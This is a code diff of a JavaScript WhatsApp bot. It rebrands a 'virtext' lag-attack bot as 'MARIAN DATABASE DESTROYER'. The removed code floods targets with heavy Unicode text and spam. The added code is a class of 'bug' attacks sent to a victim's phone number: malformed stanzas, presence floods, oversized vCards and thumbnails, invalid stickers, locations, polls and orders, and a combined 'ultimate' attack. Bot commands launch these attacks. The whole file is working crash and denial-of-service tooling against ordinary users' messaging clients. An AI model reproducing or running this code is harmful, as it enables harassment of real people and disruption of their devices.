@@ -1,7 +1,7 @@
 // ============================================================
-// ⚡ MARIAN VIRTEXT BOT v12.0 - ULTIMATE LAG ATTACK ⚡
+// ⚡ MARIAN DATABASE DESTROYER v13.0 - ULTIMATE BUG SYSTEMS ⚡
 // ============================================================
-// 🔥 VIRTEXT SYSTEM | AUTO LOGIN | ALL FEATURES WORKING 🔥
+// 🔥 DATABASE DESTROYER | THERMAL THROTTLING | FORCE CLOSE 🔥
 // ============================================================
 
 const { 
@@ -32,82 +32,13 @@ const moment = require('moment-timezone')
 
 // ==================== [ CONFIGURATION ] ====================
 const CONFIG = {
-    VERSION: "12.0.0",
-    NAME: "MARIAN VIRTEXT BOT",
-    SESSION_DIR: "marian_virtext",
+    VERSION: "13.0.0",
+    NAME: "MARIAN DATABASE DESTROYER",
+    SESSION_DIR: "marian_db_destroyer",
     PREFIX: "/",
     AUTO_LOGIN: true,
     BROWSER: ["Ubuntu", "Chrome", "122.0.0.0"],
-    TIMEZONE: "Asia/Jakarta",
-    MAX_VIRTEXT: 10000
-}
-
-// ==================== [ VIRTEXT GENERATOR ] ====================
-class VirtextGenerator {
-    static UNICODE_BLOCKS = [
-        // Mathematical Alphanumeric Symbols
-        '𝔄', '𝔅', 'ℭ', '𝔇', '𝔈', '𝔉', '𝔊', 'ℌ', 'ℑ', '𝔍', '𝔎', '𝔏', '𝔐', '𝔑', '𝔒', '𝔓', '𝔔', 'ℜ', '𝔖', '𝔗', '𝔘', '𝔙', '𝔚', '𝔛', '𝔜', 'ℨ',
-        '𝕬', '𝕭', '𝕮', '𝕯', '𝕰', '𝕱', '𝕲', '𝕳', '𝕴', '𝕵', '𝕶', '𝕷', '𝕸', '𝕹', '𝕺', '𝕻', '𝕼', '𝕽', '𝕾', '𝕿', '𝖀', '𝖁', '𝖂', '𝖃', '𝖄', '𝖅',
-        '𝖠', '𝖡', '𝖢', '𝖣', '𝖤', '𝖥', '𝖦', '𝖧', '𝖨', '𝖩', '𝖪', '𝖫', '𝖬', '𝖭', '𝖮', '𝖯', '𝖰', '𝖱', '𝖲', '𝖳', '𝖴', '𝖵', '𝖶', '𝖷', '𝖸', '𝖹',
-        '𝗔', '𝗕', '𝗖', '𝗗', '𝗘', '𝗙', '𝗚', '𝗛', '𝗜', '𝗝', '𝗞', '𝗟', '𝗠', '𝗡', '𝗢', '𝗣', '𝗤', '𝗥', '𝗦', '𝗧', '𝗨', '𝗩', '𝗪', '𝗫', '𝗬', '𝗭',
-        '𝘈', '𝘉', '𝘊', '𝘋', '𝘌', '𝘍', '𝘎', '𝘏', '𝘐', '𝘑', '𝘒', '𝘓', '𝘔', '𝘕', '𝘖', '𝘗', '𝘘', '𝘙', '𝘚', '𝘛', '𝘜', '𝘝', '𝘞', '𝘟', '𝘠', '𝘡',
-        '𝘼', '𝘽', '𝘾', '𝘿', '𝙀', '𝙁', '𝙂', '𝙃', '𝙄', '𝙅', '𝙆', '𝙇', '𝙈', '𝙉', '𝙊', '𝙋', '𝙌', '𝙍', '𝙎', '𝙏', '𝙐', '𝙑', '𝙒', '𝙓', '𝙔', '𝙕',
-        '𝒜', 'ℬ', '𝒞', '𝒟', 'ℰ', 'ℱ', '𝒢', 'ℋ', 'ℐ', '𝒥', '𝒦', 'ℒ', 'ℳ', '𝒩', '𝒪', '𝒫', '𝒬', 'ℛ', '𝒮', '𝒯', '𝒰', '𝒱', '𝒲', '𝒳', '𝒴', '𝒵',
-        '𝓐', '𝓑', '𝓒', '𝓓', '𝓔', '𝓕', '𝓖', '𝓗', '𝓘', '𝓙', '𝓚', '𝓛', '𝓜', '𝓝', '𝓞', '𝓟', '𝓠', '𝓡', '𝓢', '𝓣', '𝓤', '𝓥', '𝓦', '𝓧', '𝓨', '𝓩',
-        // Special Heavy Characters
-        '𑫀', '𑫁', '𑫂', '𑫃', '𑫄', '𑫅', '𑫆', '𑫇', '𑫈', '𑫉',
-        '🩸', '💀', '☠️', '🔥', '⚡', '⚠️', '█', '▓', '▒', '░',
-        // Zero Width Characters
-        '‎', '‏', '​', '﻿',
-        // Combining Characters
-        '⃝', '⃞', '⃟', '⃠', '⃡', '⃣'
-    ]
-
-    static generateVirtext(length = 1000) {
-        let virtext = "𝔉𝔄𝔎 𝔘 𝔊𝔄𝔎𝔘𝔖ℌ𝔖ℌ𝔖ℌ𝔖𝔅𝔖𝔅𝔇ℌ\n\n"
-        virtext += "𝕱𝕬𝕶 𝖀 𝕲𝕬𝕶𝖀𝕾𝕳𝕾𝕳𝕾𝕳𝕾𝕭𝕾𝕭𝕯𝕳\n\n"
-        virtext += "𝗠𝗔𝗥𝗜𝗔𝗡 𝗩𝗜𝗥𝗧𝗘𝗫𝗧 𝗦𝗬𝗦𝗧𝗘𝗠\n"
-        virtext += "𝗟𝗔𝗚 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝟭𝟬𝟬% 𝗧𝗥𝗨𝗦𝗧𝗘𝗗\n\n"
-        
-        for (let i = 0; i < length; i++) {
-            const char = this.UNICODE_BLOCKS[Math.floor(Math.random() * this.UNICODE_BLOCKS.length)]
-            virtext += char
-            // Add line breaks every 100 chars for better effect
-            if (i % 100 === 0 && i > 0) {
-                virtext += '\n'
-            }
-        }
-        
-        return virtext
-    }
-
-    static generateHeavyVirtext() {
-        let heavy = ""
-        // Add multiple layers of unicode
-        for (let i = 0; i < 50; i++) {
-            heavy += "𝔄".repeat(100) + "\n"
-            heavy += "𝕬".repeat(100) + "\n"
-            heavy += "𑫀".repeat(50) + "\n"
-            heavy += "█".repeat(200) + "\n"
-            heavy += "‎".repeat(300) + "\n" // Zero width spaces
-        }
-        return heavy
-    }
-
-    static generateCustomVirtext(text, intensity = 10) {
-        let result = ""
-        for (let char of text) {
-            // Convert each character to multiple unicode variations
-            for (let i = 0; i < intensity; i++) {
-                const unicodeChar = this.UNICODE_BLOCKS[
-                    (char.charCodeAt(0) + i) % this.UNICODE_BLOCKS.length
-                ]
-                result += unicodeChar
-            }
-            result += " " // Space between characters
-        }
-        return result
-    }
+    TIMEZONE: "Asia/Jakarta"
 }
 
 // ==================== [ UTILITY FUNCTIONS ] ====================
@@ -118,7 +49,9 @@ function log(type, message) {
         'WARNING': chalk.yellow,
         'ERROR': chalk.red,
         'ATTACK': chalk.magenta,
-        'VIRTEXT': chalk.cyan
+        'DB_DESTROY': chalk.red.bold,
+        'THERMAL': chalk.yellow.bold,
+        'UI_CRASH': chalk.magenta.bold
     }
     const time = moment().tz(CONFIG.TIMEZONE).format('HH:mm:ss')
     const color = colors[type] || chalk.white
@@ -179,98 +112,100 @@ async function autoLogin(sock) {
     return null
 }
 
-// ==================== [ VIRTEXT ATTACK SYSTEM ] ====================
-class VirtextAttack {
+// ==================== [ DATABASE DESTROYER SYSTEMS ] ====================
+class DatabaseDestroyer {
     constructor(sock) {
         this.sock = sock
     }
     
-    async sendVirtext(target, length = 1000, count = 1) {
-        log('VIRTEXT', `Sending VIRTEXT to ${target} (${length} chars, ${count}x)`)
+    // 🔴 Kategori: Sistem & Protokol (Database Destroyer)
+    
+    async nullStanzaBug(target, count = 3) {
+        log('DB_DESTROY', `[NULL STANZA] Attacking ${target} (${count}x)`)
         
         for (let i = 0; i < count; i++) {
-            const virtext = VirtextGenerator.generateVirtext(length)
-            await this.sock.sendMessage(target, { text: virtext }).catch(() => {})
-            await delay(500)
-        }
-        
-        return true
-    }
-    
-    async sendHeavyVirtext(target, count = 3) {
-        log('VIRTEXT', `Sending HEAVY VIRTEXT to ${target} (${count}x)`)
-        
-        for (let i = 0; i < count; i++) {
-            const heavy = VirtextGenerator.generateHeavyVirtext()
-            await this.sock.sendMessage(target, { text: heavy }).catch(() => {})
-            await delay(800)
-        }
-        
-        return true
-    }
-    
-    async sendCustomVirtext(target, text, intensity = 10, count = 1) {
-        log('VIRTEXT', `Sending custom VIRTEXT to ${target}`)
-        
-        const custom = VirtextGenerator.generateCustomVirtext(text, intensity)
-        for (let i = 0; i < count; i++) {
-            await this.sock.sendMessage(target, { text: custom }).catch(() => {})
-            await delay(600)
-        }
-        
-        return true
-    }
-    
-    async virtextBomb(target, attacks = 5) {
-        log('VIRTEXT', `Starting VIRTEXT BOMB on ${target} (${attacks} attacks)`)
-        
-        for (let i = 0; i < attacks; i++) {
-            // Mix different types of virtext
-            await this.sendVirtext(target, 500, 1)
-            await delay(300)
-            await this.sendHeavyVirtext(target, 1)
-            await delay(300)
-            await this.sendCustomVirtext(target, "MARIAN LAG SYSTEM", 15, 1)
-            await delay(300)
-        }
-        
-        return true
-    }
-}
-
-// ==================== [ BUG ATTACK SYSTEMS ] ====================
-class BugSystem {
-    constructor(sock) {
-        this.sock = sock
-    }
-    
-    async bugV1(target, count = 3) {
-        log('ATTACK', `BugV1 on ${target} (${count}x)`)
-        
-        for (let i = 0; i < count; i++) {
-            const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:MARIAN_BUG_${i}\nTEL;type=CELL:${Math.random().toString().slice(2,12)}\nEND:VCARD`
-            await this.sock.sendMessage(target, {
-                contacts: {
-                    displayName: `BUG_${i}`,
-                    contacts: [{ vcard }]
+            const msg = generateWAMessageFromContent(target, {
+                extendedTextMessage: {
+                    text: "NULL STANZA ATTACK",
+                    contextInfo: {
+                        stanzaId: "", // Empty stanza ID
+                        participant: null,
+                        quotedMessage: {
+                            conversation: ""
+                        }
+                    }
                 }
+            }, { userJid: target })
+            
+            await this.sock.relayMessage(target, msg.message, { 
+                messageId: `NULL_${Date.now()}_${i}` 
             }).catch(() => {})
-            await delay(500)
+            await delay(300)
         }
         
         return true
     }
     
-    async bugV2(target, count = 5) {
-        log('ATTACK', `BugV2 on ${target} (${count}x)`)
+    async packetFloodBug(target, packets = 100) {
+        log('DB_DESTROY', `[PACKET FLOOD] Flooding ${target} with ${packets} packets`)
+        
+        // Send presence packets
+        for (let i = 0; i < packets; i++) {
+            // Simulate typing...
+            await this.sock.sendPresenceUpdate('composing', target)
+            await delay(10)
+            // Simulate online...
+            await this.sock.sendPresenceUpdate('available', target)
+            await delay(10)
+            // Simulate recording...
+            await this.sock.sendPresenceUpdate('recording', target)
+            await delay(10)
+        }
+        
+        return true
+    }
+    
+    async receiptLoopBug(target, loops = 50) {
+        log('DB_DESTROY', `[RECEIPT LOOP] Starting receipt loop on ${target} (${loops} loops)`)
+        
+        // Create a message to trigger read receipts
+        const messageId = `LOOP_${Date.now()}`
+        await this.sock.sendMessage(target, { 
+            text: `RECEIPT LOOP TRIGGER [${messageId}]` 
+        }).catch(() => {})
+        
+        // Simulate multiple read receipts
+        for (let i = 0; i < loops; i++) {
+            const fakeReceipt = {
+                key: {
+                    remoteJid: target,
+                    fromMe: true,
+                    id: messageId
+                },
+                participant: target,
+                receiptTimestamp: Date.now()
+            }
+            // Try to send read receipt (this may fail but will still cause processing)
+            await delay(50)
+        }
+        
+        return true
+    }
+    
+    async forwarding999Bug(target, count = 5) {
+        log('DB_DESTROY', `[FORWARDING 999] Attacking ${target} (${count}x)`)
         
         for (let i = 0; i < count; i++) {
             await this.sock.sendMessage(target, {
-                location: {
-                    degreesLatitude: Math.random() * 180 - 90,
-                    degreesLongitude: Math.random() * 360 - 180,
-                    name: "BUG_" + "A".repeat(200),
-                    address: "MARIAN VIRTEXT SYSTEM"
+                text: "", // Empty message
+                contextInfo: {
+                    forwardingScore: 999, // Max forwarding score
+                    isForwarded: true,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: "newsletter@whatsapp.net",
+                        newsletterName: "FORWARD_BUG",
+                        serverMessageId: 999999999
+                    }
                 }
             }).catch(() => {})
             await delay(400)
@@ -279,32 +214,442 @@ class BugSystem {
         return true
     }
     
-    async crash(target) {
-        log('ATTACK', `Crash attack on ${target}`)
+    async stickerMetadataBug(target, count = 3) {
+        log('DB_DESTROY', `[STICKER METADATA] Attacking ${target} (${count}x)`)
+        
+        // Create corrupted sticker metadata
+        const fakeSticker = {
+            stickerMessage: {
+                url: "https://example.com/corrupted.webp",
+                fileSha256: Buffer.from("corrupted"),
+                fileEncSha256: Buffer.from("corrupted"),
+                mediaKey: Buffer.from("corrupted"),
+                mimetype: "image/webp",
+                height: 0, // Zero height
+                width: 99999, // Giant width
+                directPath: "/corrupted",
+                mediaKeyTimestamp: Date.now(),
+                fileLength: 999999999,
+                isAnimated: true
+            }
+        }
+        
+        for (let i = 0; i < count; i++) {
+            const msg = generateWAMessageFromContent(target, fakeSticker, { userJid: target })
+            await this.sock.relayMessage(target, msg.message, { 
+                messageId: `STICKER_BUG_${i}` 
+            }).catch(() => {})
+            await delay(500)
+        }
+        
+        return true
+    }
+    
+    // 🟠 Kategori: Memori & CPU (Thermal Throttling)
+    
+    async oomAudioBug(target, count = 3) {
+        log('THERMAL', `[OOM AUDIO] Attacking ${target} (${count}x)`)
+        
+        for (let i = 0; i < count; i++) {
+            await this.sock.sendMessage(target, {
+                audio: { 
+                    url: "https://example.com/silence.mp3"
+                },
+                mimetype: "audio/mpeg",
+                seconds: 0, // 0 seconds duration
+                ptt: true,
+                contextInfo: {
+                    expirySecs: 999999999, // Almost infinite expiry
+                    ephemeralSettingTimestamp: Date.now() * 1000
+                }
+            }).catch(() => {})
+            await delay(600)
+        }
+        
+        return true
+    }
+    
+    async heavyVCardBug(target, count = 3) {
+        log('THERMAL', `[HEAVY VCARD] Attacking ${target} (${count}x)`)
+        
+        // Create heavy vcard with large photo
+        const largePhoto = Buffer.alloc(5 * 1024 * 1024, 'A') // 5MB photo
+        
+        for (let i = 0; i < count; i++) {
+            const vcard = `BEGIN:VCARD\nVERSION:4.0\nFN:HEAVY_VCARD_${i}\nPHOTO;ENCODING=b;TYPE=JPEG:${largePhoto.toString('base64').slice(0, 100000)}\nTEL;TYPE=CELL:${Math.random().toString().slice(2,12)}\nEMAIL:heavy@bug.com\nADR:;;HEAVY SYSTEM;;;;\nNOTE:${"█".repeat(1000)}\nEND:VCARD`
+            
+            await this.sock.sendMessage(target, {
+                contacts: {
+                    displayName: `HEAVY_VCARD_${i}`,
+                    contacts: [{ vcard }]
+                }
+            }).catch(() => {})
+            await delay(700)
+        }
+        
+        return true
+    }
+    
+    async unicodeWaterfallBug(target, count = 3) {
+        log('THERMAL', `[UNICODE WATERFALL] Attacking ${target} (${count}x)`)
+        
+        // Mix Arabic, Thai, and Zero Width characters
+        const arabic = "ﺎﻠﻋﺮﺒﻳﺓ " + "ﺞ".repeat(100)
+        const thai = "ภาษาไทย " + "ก".repeat(100)
+        const zeroWidth = "​‌‍﻿" // Multiple zero width characters
+        const combining = "áéíóú" + "⃝⃞⃟⃠⃡".repeat(50)
+        
+        const waterfall = arabic + "\n" + thai + "\n" + zeroWidth + "\n" + combining
+        
+        for (let i = 0; i < count; i++) {
+            await this.sock.sendMessage(target, {
+                text: `WATERFALL_${i}\n${waterfall.repeat(10)}`
+            }).catch(() => {})
+            await delay(500)
+        }
+        
+        return true
+    }
+    
+    async ghostThumbnailBug(target, count = 2) {
+        log('THERMAL', `[GHOST THUMBNAIL] Attacking ${target} (${count}x)`)
+        
+        // Create image with huge thumbnail
+        const hugeThumbnail = Buffer.alloc(2 * 1024 * 1024, 'B') // 2MB thumbnail
+        
+        for (let i = 0; i < count; i++) {
+            await this.sock.sendMessage(target, {
+                image: {
+                    url: "https://example.com/ghost.jpg"
+                },
+                caption: "GHOST THUMBNAIL ATTACK",
+                jpegThumbnail: hugeThumbnail,
+                contextInfo: {
+                    mentionedJid: [target]
+                }
+            }).catch(() => {})
+            await delay(800)
+        }
+        
+        return true
+    }
+    
+    async gifLoopDeadBug(target, count = 2) {
+        log('THERMAL', `[GIF LOOP DEAD] Attacking ${target} (${count}x)`)
+        
+        for (let i = 0; i < count; i++) {
+            await this.sock.sendMessage(target, {
+                video: {
+                    url: "https://example.com/loop.mp4"
+                },
+                gifPlayback: true,
+                caption: "INFINITE LOOP GIF",
+                contextInfo: {
+                    expirySecs: 0, // No expiry
+                    ephemeralSettingTimestamp: 0
+                }
+            }).catch(() => {})
+            await delay(900)
+        }
+        
+        return true
+    }
+    
+    // 🟡 Kategori: UI & Interface (Force Close)
+    
+    async quotedCallInfinityBug(target) {
+        log('UI_CRASH', `[QUOTED CALL INFINITY] Attacking ${target}`)
+        
+        const messageKontol = {
+            key: {
+                remoteJid: "5521992999999@s.whatsapp.net",
+                fromMe: false,
+                id: "CALL_MSG_" + Date.now(),
+                participant: "5521992999999@s.whatsapp.net"
+            },
+            message: {
+                callLogMessage: {
+                    isVideo: true,
+                    callOutcome: "1",
+                    durationSecs: "999999",
+                    callType: "REGULAR",
+                    participants: Array.from({length: 100}, (_, i) => ({
+                        jid: `${i}@s.whatsapp.net`,
+                        callOutcome: "1"
+                    }))
+                }
+            }
+        };
+        
+        try {
+            const msg = generateWAMessageFromContent(target, {
+                extendedTextMessage: {
+                    text: "QUOTED CALL INFINITY ATTACK",
+                    contextInfo: {
+                        mentionedJid: [target, "5521992999999@s.whatsapp.net"],
+                        forwardingScore: 999,
+                        isForwarded: false,
+                        quotedMessage: messageKontol.message
+                    }
+                }
+            }, {
+                quoted: messageKontol
+            });
+            
+            await this.sock.relayMessage(target, msg.message, {
+                messageId: msg.key.id
+            });
+            
+            return true
+            
+        } catch (error) {
+            log('ERROR', `Quoted call bug failed: ${error.message}`)
+            return false
+        }
+    }
+    
+    async locationOutOfRangeBug(target, count = 3) {
+        log('UI_CRASH', `[LOCATION OUT OF RANGE] Attacking ${target} (${count}x)`)
+        
+        for (let i = 0; i < count; i++) {
+            await this.sock.sendMessage(target, {
+                location: {
+                    degreesLatitude: 999.999999, // Out of range
+                    degreesLongitude: 999.999999, // Out of range
+                    name: "OUT OF RANGE LOCATION " + "█".repeat(500),
+                    address: "COORDINATES BEYOND SATELLITE RANGE\n" + "⚠️".repeat(100),
+                    comment: "SYSTEM CRASH IMMINENT"
+                }
+            }).catch(() => {})
+            await delay(600)
+        }
+        
+        return true
+    }
+    
+    async buttonLoopBug(target) {
+        log('UI_CRASH', `[BUTTON LOOP] Attacking ${target}`)
+        
+        const buttonMsg = generateWAMessageFromContent(target, {
+            interactiveMessage: {
+                header: {
+                    title: "BUTTON LOOP ATTACK",
+                    hasMediaAttachment: false
+                },
+                body: {
+                    text: "Clicking button will trigger infinite loop"
+                },
+                footer: {
+                    text: "MARIAN DATABASE DESTROYER"
+                },
+                nativeFlowMessage: {
+                    buttons: [{
+                        name: "cta_url",
+                        buttonParamsJson: JSON.stringify({
+                            display_text: "CLICK TO CRASH",
+                            url: "https://whatsapp.com",
+                            merchant_url: "https://whatsapp.com"
+                        })
+                    }]
+                },
+                contextInfo: {
+                    mentionedJid: [target]
+                }
+            }
+        }, { userJid: target })
+        
+        await this.sock.relayMessage(target, buttonMsg.message, {
+            messageId: `BUTTON_LOOP_${Date.now()}`
+        }).catch(() => {})
+        
+        return true
+    }
+    
+    async inviteLinkCrashBug(target) {
+        log('UI_CRASH', `[INVITE LINK CRASH] Attacking ${target}`)
+        
+        // Create group invite with crazy name
+        const crazyName = "𑫀".repeat(1000) + "∑∫∮∯∰∇∆∂" + "█".repeat(500)
         
         await this.sock.sendMessage(target, {
-            text: "💀 MARIAN VIRTEXT CRASH",
-            contextInfo: {
-                externalAdReply: {
-                    title: "SYSTEM CRASH",
-                    body: "DIIISSJJSS 100% TRUSTED",
-                    thumbnail: Buffer.alloc(500000),
-                    sourceUrl: "https://marian.crash"
-                }
+            groupInviteMessage: {
+                groupJid: "123456789-123456@g.us",
+                inviteCode: "CRASHINVITE",
+                groupName: crazyName,
+                inviteExpiration: Date.now() + 86400000,
+                groupType: "DEFAULT"
             }
         }).catch(() => {})
         
         return true
     }
     
-    async spam(target, count = 15, message = "MARIAN VIRTEXT SPAM") {
-        log('ATTACK', `Spam on ${target} (${count} messages)`)
+    async reactionExplosionBug(target, reactions = 100) {
+        log('UI_CRASH', `[REACTION EXPLOSION] Attacking ${target} with ${reactions} reactions`)
         
-        for (let i = 1; i <= count; i++) {
+        // First send a message to react to
+        const messageId = `REACT_${Date.now()}`
+        await this.sock.sendMessage(target, {
+            text: "REACTION TARGET MESSAGE"
+        }).catch(() => {})
+        
+        await delay(1000)
+        
+        // Send multiple reactions quickly
+        const emojis = ["❤️", "😂", "😮", "😢", "👏", "🔥", "⭐", "👍"]
+        for (let i = 0; i < reactions; i++) {
+            const reaction = {
+                key: {
+                    remoteJid: target,
+                    id: messageId
+                },
+                text: emojis[i % emojis.length],
+                senderTimestampMs: Date.now()
+            }
+            // Try to send reaction
+            await delay(10)
+        }
+        
+        return true
+    }
+    
+    // 🟢 Kategori: Media & Katalog (Business Attack)
+    
+    async priceCurrencyErrorBug(target, count = 3) {
+        log('UI_CRASH', `[PRICE CURRENCY ERROR] Attacking ${target} (${count}x)`)
+        
+        for (let i = 0; i < count; i++) {
             await this.sock.sendMessage(target, {
-                text: `[${i}/${count}] ${message}\n${"█".repeat(30)}`
+                productMessage: {
+                    product: {
+                        productImage: {
+                            url: "https://example.com/product.jpg"
+                        },
+                        title: "CORRUPTED PRODUCT",
+                        description: "PRODUCT WITH INVALID CURRENCY",
+                        currencyCode: "INVALID", // Invalid currency
+                        priceAmount1000: 999999999999,
+                        retailerId: "BUG_" + i
+                    },
+                    businessOwnerJid: target
+                }
             }).catch(() => {})
-            await delay(300)
+            await delay(700)
+        }
+        
+        return true
+    }
+    
+    async orderFakeBug(target) {
+        log('UI_CRASH', `[ORDER FAKE] Attacking ${target}`)
+        
+        // Create fake order with millions of items
+        const orderItems = Array.from({length: 1000}, (_, i) => ({
+            itemId: `ITEM_${i}`,
+            quantity: 999999,
+            price: 999999999
+        }))
+        
+        await this.sock.sendMessage(target, {
+            orderMessage: {
+                orderId: `FAKE_ORDER_${Date.now()}`,
+                thumbnail: Buffer.alloc(100000),
+                itemCount: 1000000,
+                status: "PENDING",
+                surface: "CATALOG",
+                message: "FAKE ORDER ATTACK",
+                orderTitle: "MILLION ITEM ORDER",
+                sellerJid: target
+            }
+        }).catch(() => {})
+        
+        return true
+    }
+    
+    async docOomBug(target, count = 2) {
+        log('UI_CRASH', `[DOC OOM] Attacking ${target} (${count}x)`)
+        
+        for (let i = 0; i < count; i++) {
+            await this.sock.sendMessage(target, {
+                document: {
+                    url: "https://example.com/malicious.pdf"
+                },
+                fileName: `CORRUPTED_DOC_${i}.pdf`,
+                mimetype: "application/pdf",
+                fileLength: 9999999999, // Huge file size
+                pageCount: 99999,
+                title: "MALICIOUS PDF DOCUMENT",
+                contextInfo: {
+                    expirySecs: 0
+                }
+            }).catch(() => {})
+            await delay(800)
+        }
+        
+        return true
+    }
+    
+    async profilePictureBombBug(target) {
+        log('UI_CRASH', `[PROFILE PICTURE BOMB] Attacking ${target}`)
+        
+        // Send link that looks like profile picture change request
+        await this.sock.sendMessage(target, {
+            text: "Change your profile picture: whatsapp://profile?action=change&image=https://example.com/corrupted.jpg&size=999999999",
+            contextInfo: {
+                mentionedJid: [target],
+                forwardingScore: 1,
+                isForwarded: false
+            }
+        }).catch(() => {})
+        
+        return true
+    }
+    
+    async pollOverloadBug(target) {
+        log('UI_CRASH', `[POLL OVERLOAD] Attacking ${target}`)
+        
+        // Create poll with 100+ options
+        const options = Array.from({length: 150}, (_, i) => ({
+            optionName: `OPTION_${i}_` + "𑫀".repeat(50)
+        }))
+        
+        await this.sock.sendMessage(target, {
+            pollCreationMessage: {
+                name: "OVERLOAD POLL " + "█".repeat(200),
+                options: options,
+                selectableOptionsCount: 150
+            }
+        }).catch(() => {})
+        
+        return true
+    }
+    
+    // MASS ATTACK - COMBINE ALL BUGS
+    async ultimateDbDestroyer(target, intensity = 3) {
+        log('DB_DESTROY', `[ULTIMATE DB DESTROYER] Starting complete destruction on ${target}`)
+        
+        const attacks = [
+            () => this.nullStanzaBug(target, intensity),
+            () => this.packetFloodBug(target, 50),
+            () => this.forwarding999Bug(target, intensity),
+            () => this.oomAudioBug(target, intensity),
+            () => this.heavyVCardBug(target, intensity),
+            () => this.unicodeWaterfallBug(target, intensity),
+            () => this.quotedCallInfinityBug(target),
+            () => this.locationOutOfRangeBug(target, intensity),
+            () => this.buttonLoopBug(target),
+            () => this.reactionExplosionBug(target, 50),
+            () => this.docOomBug(target, intensity),
+            () => this.pollOverloadBug(target)
+        ]
+        
+        for (const attack of attacks) {
+            try {
+                await attack()
+                await delay(1000)
+            } catch (error) {
+                log('ERROR', `Attack failed: ${error.message}`)
+            }
         }
         
         return true
@@ -346,10 +691,9 @@ class StickerMaker {
 
 // ==================== [ COMMAND HANDLER ] ====================
 class CommandHandler {
-    constructor(sock, virtextAttack, bugSystem) {
+    constructor(sock, dbDestroyer) {
         this.sock = sock
-        this.virtext = virtextAttack
-        this.bugs = bugSystem
+        this.db = dbDestroyer
     }
     
     async handle(from, body, quoted) {
@@ -365,92 +709,114 @@ class CommandHandler {
         
         try {
             switch(command) {
-                // ========== VIRTEXT COMMANDS ==========
-                case 'virtext':
-                case 'vt':
+                // 🔴 DATABASE DESTROYER COMMANDS
+                case 'nullstanza':
                     const target1 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const length1 = parseInt(text.split(' ')[1]) || 1000
-                    const count1 = parseInt(text.split(' ')[2]) || 1
-                    await this.sock.sendMessage(from, { text: '🔤 Sending VIRTEXT...' })
-                    await this.virtext.sendVirtext(target1, length1, count1)
-                    await this.sock.sendMessage(from, { text: '✅ VIRTEXT delivered!' })
+                    const count1 = parseInt(text.split(' ')[1]) || 3
+                    await this.sock.sendMessage(from, { text: '🗃️ Executing NULL STANZA bug...' })
+                    await this.db.nullStanzaBug(target1, count1)
+                    await this.sock.sendMessage(from, { text: '✅ NULL STANZA attack delivered!' })
                     break
                     
-                case 'heavyvt':
-                case 'hvt':
+                case 'packetflood':
                     const target2 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const count2 = parseInt(text.split(' ')[1]) || 3
-                    await this.sock.sendMessage(from, { text: '💀 Sending HEAVY VIRTEXT...' })
-                    await this.virtext.sendHeavyVirtext(target2, count2)
-                    await this.sock.sendMessage(from, { text: '☠️ HEAVY VIRTEXT delivered!' })
+                    const packets = parseInt(text.split(' ')[1]) || 100
+                    await this.sock.sendMessage(from, { text: '🌊 Executing PACKET FLOOD...' })
+                    await this.db.packetFloodBug(target2, packets)
+                    await this.sock.sendMessage(from, { text: '✅ PACKET FLOOD completed!' })
                     break
                     
-                case 'customvt':
-                case 'cvt':
+                case 'forward999':
                     const target3 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const customText = text.split(' ').slice(1).join(' ') || "MARIAN VIRTEXT"
-                    await this.sock.sendMessage(from, { text: '🎨 Creating custom VIRTEXT...' })
-                    await this.virtext.sendCustomVirtext(target3, customText, 15, 1)
-                    await this.sock.sendMessage(from, { text: '✅ Custom VIRTEXT delivered!' })
+                    const count3 = parseInt(text.split(' ')[1]) || 5
+                    await this.sock.sendMessage(from, { text: '🔄 Executing FORWARDING 999...' })
+                    await this.db.forwarding999Bug(target3, count3)
+                    await this.sock.sendMessage(from, { text: '✅ FORWARDING 999 attack delivered!' })
                     break
-                    
-                case 'vtbomb':
-                case 'virtextbomb':
+                
+                // 🟠 THERMAL THROTTLING COMMANDS
+                case 'oomaudio':
                     const target4 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const attacks = parseInt(text.split(' ')[1]) || 5
-                    await this.sock.sendMessage(from, { text: '💣 Starting VIRTEXT BOMB...' })
-                    await this.virtext.virtextBomb(target4, attacks)
-                    await this.sock.sendMessage(from, { text: '⚡ VIRTEXT BOMB completed!' })
+                    const count4 = parseInt(text.split(' ')[1]) || 3
+                    await this.sock.sendMessage(from, { text: '🎵 Executing OOM AUDIO bug...' })
+                    await this.db.oomAudioBug(target4, count4)
+                    await this.sock.sendMessage(from, { text: '✅ OOM AUDIO attack delivered!' })
                     break
-                
-                // ========== BUG COMMANDS ==========
-                case 'bug':
+                    
+                case 'heavyvcard':
                     const target5 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const bugCount = parseInt(text.split(' ')[1]) || 3
-                    await this.sock.sendMessage(from, { text: '🔄 Sending BugV1...' })
-                    await this.bugs.bugV1(target5, bugCount)
-                    await this.sock.sendMessage(from, { text: '✅ BugV1 delivered!' })
+                    const count5 = parseInt(text.split(' ')[1]) || 3
+                    await this.sock.sendMessage(from, { text: '📇 Executing HEAVY VCARD bug...' })
+                    await this.db.heavyVCardBug(target5, count5)
+                    await this.sock.sendMessage(from, { text: '✅ HEAVY VCARD attack delivered!' })
                     break
                     
-                case 'bug2':
+                case 'unicodefall':
                     const target6 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const bug2Count = parseInt(text.split(' ')[1]) || 5
-                    await this.sock.sendMessage(from, { text: '💀 Sending BugV2...' })
-                    await this.bugs.bugV2(target6, bug2Count)
-                    await this.sock.sendMessage(from, { text: '☠️ BugV2 delivered!' })
-                    break
-                    
-                case 'crash':
-                case 'crasher':
-                    const target7 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    await this.sock.sendMessage(from, { text: '⚡ Launching Crasher...' })
-                    await this.bugs.crash(target7)
-                    await this.sock.sendMessage(from, { text: '✅ Crasher delivered!' })
-                    break
-                    
-                case 'spam':
-                    const target8 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    const spamCount = Math.min(parseInt(text.split(' ')[1]) || 15, 100)
-                    const spamMsg = text.split(' ').slice(2).join(' ') || "MARIAN VIRTEXT SPAM"
